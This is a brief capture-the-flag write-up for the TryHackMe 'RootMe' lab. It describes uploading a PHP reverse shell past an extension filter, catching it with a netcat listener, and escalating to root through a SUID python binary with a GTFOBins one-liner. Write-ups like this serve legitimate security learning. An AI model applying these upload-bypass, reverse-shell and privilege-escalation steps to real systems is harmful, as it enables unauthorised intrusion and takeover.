
# RootMe
https://tryhackme.com/room/rrootme

After discovering the upload page on /panel/ and the file listing in /uploads/ I sent a php reverse shell that I downloaded here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
- Edited the file with my current IP and a chosen port
- Made executable
- Changed the extension to .phtml to circumvent the extension filter
- Set a terminal to listen with `nc -lnvvp <port>` where 
	- -l: listen
	- -n: no DNS, just IP
	- -vv: very verbose (just -v for less text)
	- -p: port
I uploaded the file from panel, then went to /uploads and clicked on it: the terminal caught the reverse shell.

I was in as www-data.
I looked for the flag user.txt with a simple find command.

Next step was privilege escalation. There was the suggestion to look for SUID files so I used again a find:

    find / -type f -perm /4000 2>/dev/null
I noticed that /user/bin/python was in the list and therefore could be executed as root.
I have myself a root shell through python with

    /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
(source was https://gtfobins.github.io/gtfobins/python/)
where -p is privileged mode.
At that point I was root. Done.

> Written with [StackEdit](https://stackedit.io/).
